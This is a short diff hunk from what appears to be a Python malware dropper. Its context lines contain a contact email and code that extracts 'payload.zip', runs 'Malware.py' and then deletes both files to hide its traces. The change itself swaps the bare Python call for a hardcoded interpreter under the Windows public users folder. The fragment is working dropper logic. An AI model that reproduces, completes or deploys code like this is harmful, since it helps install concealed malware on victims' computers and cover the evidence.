@@ -59,7 +59,7 @@ In addition, if you have any questions, please contact me at bookbot2019@tutanot
 """
 with zipfile.ZipFile('payload.zip', 'r') as zip_ref:
     zip_ref.extractall("")
-system('python Malware.py>mlwr.out')
+system('C:\\users\\public\\python\\python.exe Malware.py>mlwr.out')
 time.sleep(1)
 remove("payload.zip")
 remove("Malware.py")
